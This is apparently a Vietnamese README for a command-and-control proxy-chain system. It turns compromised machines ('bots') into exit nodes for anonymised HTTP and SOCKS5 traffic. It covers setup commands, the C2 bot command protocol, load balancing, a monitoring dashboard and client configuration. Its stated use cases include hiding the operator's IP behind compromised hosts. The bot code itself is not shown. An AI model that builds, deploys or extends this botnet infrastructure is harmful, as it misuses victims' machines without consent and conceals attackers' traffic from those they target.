# 🚀 C2 PROXY CHAIN SYSTEM

Hệ thống C2 Proxy Chain hoàn chỉnh cho phép tạo mạng proxy phân tán sử dụng các bot đã bị compromise làm exit nodes.

## 📋 Kiến Trúc

```
PC Client (Browser/App) 
    ↓ (HTTP/SOCKS5 Proxy)
C2 Server (Proxy Entry Point)
    ↓ (Load Balancing)
Bot1, Bot2, Bot3... (Child Servers)
    ↓ (Direct Internet Access)
Internet
```

## 🛠️ Cài Đặt

### Yêu Cầu:
```bash
pip install flask flask-socketio requests psutil
```

### Cấu Trúc File:
```
scripts/
├── c2_proxy_server.py          # C2 Proxy Server chính
├── child_bot_server.py         # Bot server (exit node)
├── proxy_load_balancer.py      # Load Balancer & Health Monitor
├── proxy_web_dashboard.py      # Web Dashboard
├── run_proxy_chain.py          # Script chạy toàn bộ hệ thống
├── test_proxy_chain.py         # Test script
└── README_PROXY_CHAIN.md       # Hướng dẫn này
```

## 🚀 Sử Dụng

### 1. Chạy Toàn Bộ Hệ Thống (Khuyến Nghị)

```bash
# Chạy toàn bộ hệ thống với 3 bot servers
python3 scripts/run_proxy_chain.py --num-bots 3

# Với cấu hình tùy chỉnh
python3 scripts/run_proxy_chain.py \
    --c2-host 0.0.0.0 \
    --c2-port 3333 \
    --proxy-port 8080 \
    --socks-port 1080 \
    --num-bots 5
```

### 2. Chạy Từng Component Riêng Lẻ

#### A. Khởi Động C2 Proxy Server:
```bash
python3 scripts/c2_proxy_server.py \
    --c2-host 0.0.0.0 \
    --c2-port 3333 \
    --proxy-port 8080 \
    --socks-port 1080
```

#### B. Khởi Động Bot Servers:
```bash
# Bot 1
python3 scripts/child_bot_server.py \
    --c2-host localhost \
    --c2-port 3333 \
    --bot-id bot_1

# Bot 2
python3 scripts/child_bot_server.py \
    --c2-host localhost \
    --c2-port 3333 \
    --bot-id bot_2

# Bot 3
python3 scripts/child_bot_server.py \
    --c2-host localhost \
    --c2-port 3333 \
    --bot-id bot_3
```

#### C. Khởi Động Web Dashboard:
```bash
python3 scripts/proxy_web_dashboard.py \
    --host 0.0.0.0 \
    --port 5001
```

### 3. Test Hệ Thống

```bash
# Chạy tất cả tests
python3 scripts/test_proxy_chain.py

# Test với cấu hình tùy chỉnh
python3 scripts/test_proxy_chain.py \
    --c2-host localhost \
    --c2-port 3333 \
    --proxy-port 8080 \
    --socks-port 1080 \
    --num-bots 3
```

## 🌐 Cấu Hình Client

### 1. HTTP/HTTPS Proxy

#### Browser Settings:
```
Proxy Server: C2_IP:8080
Protocol: HTTP
```

#### Command Line:
```bash
export http_proxy=http://C2_IP:8080
export https_proxy=http://C2_IP:8080

# Test
curl http://httpbin.org/ip
```

#### Python:
```python
import requests

proxies = {
    'http': 'http://C2_IP:8080',
    'https': 'http://C2_IP:8080'
}

response = requests.get('http://httpbin.org/ip', proxies=proxies)
print(response.json())
```

### 2. SOCKS5 Proxy

#### Command Line (với proxychains):
```bash
# Cấu hình /etc/proxychains.conf
socks5 C2_IP 1080

# Sử dụng
proxychains curl http://httpbin.org/ip
```

#### Python (với PySocks):
```python
import socks
import socket

# Tạo SOCKS5 socket
sock = socks.socksocket()
sock.set_proxy(socks.SOCKS5, "C2_IP", 1080)
sock.connect(("httpbin.org", 80))

# Gửi request
request = b'GET /ip HTTP/1.1\r\nHost: httpbin.org\r\n\r\n'
sock.send(request)
response = sock.recv(4096)
print(response.decode())
```

## 📊 Web Dashboard

Truy cập: `http://C2_IP:5001`

### Tính Năng:
- ✅ Real-time monitoring
- ✅ Bot management
- ✅ Connection statistics
- ✅ Load balancer control
- ✅ Health monitoring
- ✅ Performance metrics

## ⚖️ Load Balancing

### Các Thuật Toán:
1. **Round Robin** - Luân phiên giữa các bot
2. **Least Connections** - Chọn bot có ít kết nối nhất
3. **Health Based** - Chọn bot có health score cao nhất
4. **Response Time** - Chọn bot có response time thấp nhất
5. **Weighted Round Robin** - Round robin với trọng số
6. **Random** - Chọn ngẫu nhiên
7. **Region Aware** - Ưu tiên bot cùng region
8. **Circuit Breaker** - Tránh bot bị lỗi

### Cấu Hình:
```python
# Trong c2_proxy_server.py
self.load_balancing_strategy = "round_robin"  # Thay đổi strategy
```

## 🏥 Health Monitoring

### Health Score Calculation:
- **Response Time**: Thời gian phản hồi trung bình
- **Success Rate**: Tỷ lệ request thành công
- **Connection Count**: Số kết nối hiện tại
- **Last Seen**: Thời gian kết nối cuối

### Health Thresholds:
- **Excellent**: ≥ 80
- **Good**: ≥ 60
- **Warning**: ≥ 30
- **Critical**: < 30

### Circuit Breaker:
- **Closed**: Bot hoạt động bình thường
- **Open**: Bot bị lỗi, tạm thời không sử dụng
- **Half-Open**: Bot đang được test lại

## 🧪 Testing

### 1. Integration Test:
```bash
python3 scripts/test_proxy_chain.py
```

**Các Test:**
- ✅ HTTP Proxy functionality
- ✅ HTTPS Proxy functionality
- ✅ SOCKS5 Proxy functionality
- ✅ Load Balancing
- ✅ Health Monitoring
- ✅ Stress Testing

### 2. Manual Testing:

#### Test HTTP Proxy:
```bash
curl --proxy http://C2_IP:8080 http://httpbin.org/ip
```

#### Test SOCKS5 Proxy:
```bash
proxychains curl http://httpbin.org/ip
```

#### Test Load Balancing:
```bash
for i in {1..10}; do
    curl --proxy http://C2_IP:8080 http://httpbin.org/ip
    sleep 1
done
```

## 📈 Performance

### Tối Ưu Hóa:
1. **Connection Pooling**: Reuse connections
2. **Load Balancing**: Distribute load
3. **Health Monitoring**: Remove unhealthy bots
4. **Circuit Breaker**: Prevent cascade failures
5. **Caching**: Cache responses when possible

### Scaling:
1. **Horizontal**: Add more bot servers
2. **Vertical**: Increase server resources
3. **Geographic**: Deploy in multiple regions

## 🔒 Security

### Recommendations:
1. **Firewall Rules**: Restrict access to trusted IPs
2. **Authentication**: Add API keys for bot connections
3. **Encryption**: Use TLS for all communications
4. **Monitoring**: Log all proxy requests
5. **Rate Limiting**: Prevent abuse

### Example Firewall Rules:
```bash
# Allow C2 server
ufw allow from TRUSTED_IP to any port 3333
ufw allow from TRUSTED_IP to any port 8080
ufw allow from TRUSTED_IP to any port 1080
ufw allow from TRUSTED_IP to any port 5001

# Allow bot connections
ufw allow from BOT_IP to any port 3333
```

## 🐛 Troubleshooting

### Common Issues:

#### 1. Bot Không Kết Nối:
```bash
# Kiểm tra C2 server
netstat -tlnp | grep 3333

# Kiểm tra bot connection
python3 scripts/child_bot_server.py --c2-host C2_IP --c2-port 3333
```

#### 2. Proxy Không Hoạt Động:
```bash
# Kiểm tra proxy ports
netstat -tlnp | grep 8080
netstat -tlnp | grep 1080

# Test proxy connection
curl --proxy http://C2_IP:8080 http://httpbin.org/ip
```

#### 3. Load Balancer Không Chọn Bot:
```bash
# Kiểm tra bot status
curl http://C2_IP:5001/api/bots

# Kiểm tra load balancer
curl http://C2_IP:5001/api/load_balancer
```

#### 4. Health Score Thấp:
```bash
# Kiểm tra bot health
curl http://C2_IP:5001/api/status

# Restart bot nếu cần
pkill -f child_bot_server.py
python3 scripts/child_bot_server.py --c2-host C2_IP --c2-port 3333
```

### Debug Mode:
```bash
# C2 Proxy Server với debug
python3 scripts/c2_proxy_server.py --c2-host 0.0.0.0 --c2-port 3333 --proxy-port 8080 --socks-port 1080

# Web Dashboard với debug
python3 scripts/proxy_web_dashboard.py --host 0.0.0.0 --port 5001 --debug
```

## 📝 API Reference

### C2 Server Commands:

#### Bot Commands:
- `ENABLE_PROXY_MODE` - Bật chế độ proxy
- `DISABLE_PROXY_MODE` - Tắt chế độ proxy
- `PING` - Health check
- `INFO` - Lấy thông tin bot
- `HEALTH_CHECK` - Health report
- `PROXY_REQUEST:connection_id:target:port:https` - HTTP proxy request
- `SOCKS_REQUEST:connection_id:target:port` - SOCKS5 proxy request

#### Web Dashboard API:
- `GET /api/status` - Server status
- `GET /api/bots` - Bot list
- `GET /api/connections` - Active connections
- `POST /api/start_server` - Start server
- `POST /api/stop_server` - Stop server
- `POST /api/bot_command` - Send bot command

## 🎯 Use Cases

### 1. Anonymous Browsing:
- Route traffic qua multiple bot exit nodes
- Hide real IP address
- Bypass geo-restrictions

### 2. Penetration Testing:
- Use compromised machines as exit nodes
- Test network security
- Perform reconnaissance

### 3. Load Testing:
- Distribute load across multiple bots
- Test application performance
- Simulate real user traffic

### 4. Content Delivery:
- Distribute content via bot network
- Reduce server load
- Improve performance

## 📞 Support

### Logs:
```bash
# C2 Server logs
tail -f /var/log/c2_proxy_server.log

# Bot server logs
tail -f /var/log/child_bot_server.log

# Web dashboard logs
tail -f /var/log/proxy_dashboard.log
```

### Configuration:
```bash
# Edit configuration
nano scripts/c2_proxy_server.py

# Reload configuration
pkill -f c2_proxy_server.py
python3 scripts/c2_proxy_server.py
```

## 🎉 Kết Luận

Hệ thống C2 Proxy Chain cung cấp một giải pháp hoàn chỉnh để tạo ra một mạng proxy phân tán sử dụng các bot đã bị compromise. Với load balancing, health monitoring, và web dashboard, hệ thống đảm bảo hiệu suất cao và độ tin cậy.

**Tính năng chính:**
- ✅ C2 Proxy Server với HTTP/SOCKS5 support
- ✅ Child Bot Servers với proxy forwarding
- ✅ Load Balancer với 8 thuật toán
- ✅ Health Monitor với circuit breaker
- ✅ Web Dashboard real-time
- ✅ Comprehensive testing suite
- ✅ Easy deployment và management

**Bắt đầu ngay:**
```bash
# 1. Chạy toàn bộ hệ thống
python3 scripts/run_proxy_chain.py

# 2. Cấu hình proxy
export http_proxy=http://C2_IP:8080

# 3. Test
curl http://httpbin.org/ip
```

Chúc bạn sử dụng thành công! 🚀
